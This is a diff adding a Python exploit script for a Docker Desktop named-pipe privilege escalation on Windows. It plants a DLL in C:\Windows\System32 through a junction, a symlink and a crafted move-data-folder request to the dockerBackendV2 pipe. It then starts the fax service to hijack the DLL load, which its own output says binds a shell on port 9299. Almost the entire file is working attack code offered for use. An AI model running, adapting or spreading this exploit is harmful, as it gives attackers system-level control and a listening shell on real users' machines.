@@ -1,0 +1,70 @@
+import os
+import json
+import win32file
+import subprocess
+import shutil
+
+sourceDir = "C:\\tmp\\abc"
+targetDir = "C:\\tmp\\proxy"
+targetFile = "DockerDesktop.vhdx"
+
+print("[*]Docker named pipe Privilege Escalation exp")
+
+print("[*]Drop the exp res")
+if not os.path.exists(sourceDir):
+    os.mkdir(sourceDir)
+
+
+
+resFile = os.getcwd() + "\\" + "ualapi.dll"
+if not os.path.exists(sourceDir + "\\"+targetFile):
+    shutil.copyfile(resFile,sourceDir + "\\"+targetFile)
+
+print("[*]Create junction directory c:\\tmp\proxy")
+cmdline = os.getcwd() + "\\junction64.exe " + targetDir + " C:\\Windows\\System32"
+result = os.system(cmdline)
+#print(result)
+
+print("[*]Create Symlink from C:\\tmp\\proxy\\DockerDesktop.vhdx RPC Control=> \??\C:\\windows\\system32\\ualapi.dll")
+symlinkDestination = "C:\\windows\\system32\\ualapi.dll"
+targetPath = "C:\\tmp\\proxy\\DockerDesktop.vhdx"
+cmdline = os.getcwd() + "\\CreateSymlink.exe -p C:\\tmp\\proxy\\DockerDesktop.vhdx C:\\windows\\system32\\ualapi.dll"
+result = os.system(cmdline)
+#print(result)
+
+print("[*]Connect to docker service: dockerBackendV2")
+pHandle = win32file.CreateFile('\\\\.\\pipe\\dockerBackendV2', win32file.GENERIC_READ | win32file.GENERIC_WRITE, 0, None, win32file.OPEN_EXISTING, 0, None)
+print("[*]PipeHandle: " + str(pHandle))
+#data = {'OldDir' : 'C:\\tmp\\abc','NewDir':'C:\\windows'}
+data = {'OldDir' : 'C:\\tmp\\abc','NewDir':'C:\\tmp\\proxy'}
+
+#do a GET request
+"""
+print("[*]Request: GET /version")
+requestData = b"GET /version HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n"
+win32file.WriteFile(pHandle, requestData, None)
+recvBuffer = win32file.ReadFile(pHandle, 512)
+print("[*]Respose: " + str(recvBuffer[1]))
+requestData = b"GET /hyperv/bootloader HTTP/1.1\r\n\r\n"
+win32file.WriteFile(pHandle, requestData, None)
+"""
+
+#do a POST request
+print("[*]Only one chance")
+print("[*]Request: POST /move-data-folder")
+requestData = 'POST /hyperv/move-data-folder HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nAccept: */*\r\n'
+requestData += 'Content-Type: application/json\r\n'
+requestData += 'Content-Length: ' + str(len(json.dumps(data))) + '\r\n\r\n'
+requestData += json.dumps(data)
+print("[*]Request Data: \n" + requestData)
+requestData = bytes(requestData, 'utf-8')
+win32file.WriteFile(pHandle, requestData, None)
+win32file.CloseHandle(pHandle)
+
+print("[*]Trigger service fax to start => get dll hijacking => bind a shell on port 9299")
+cmdline = "net start fax"
+os.system(cmdline)
+
+
+
+
